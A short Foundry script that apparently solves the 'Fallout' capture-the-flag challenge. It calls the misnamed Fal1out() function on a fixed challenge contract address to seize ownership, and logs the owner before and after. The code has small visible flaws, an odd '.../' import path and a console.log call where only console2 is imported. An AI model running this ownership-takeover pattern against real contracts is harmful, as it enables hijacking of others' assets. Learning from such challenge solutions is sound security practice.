// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Fallout} from ".../src/Challenge-2.sol";
import {Script, console2} from "forge-std/Script.sol";

contract FalloutSolution is Script {

    Fallout public falloutInstance = Fallout(0x94590fd2E7917F1C4291F1466209F81eD5A42aAf);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Owner before: ", falloutInstance.owner());
        falloutInstance.Fal1out();
        console.log("Owner after: ", falloutInstance.owner());
        
        vm.stopBroadcast();
    }
}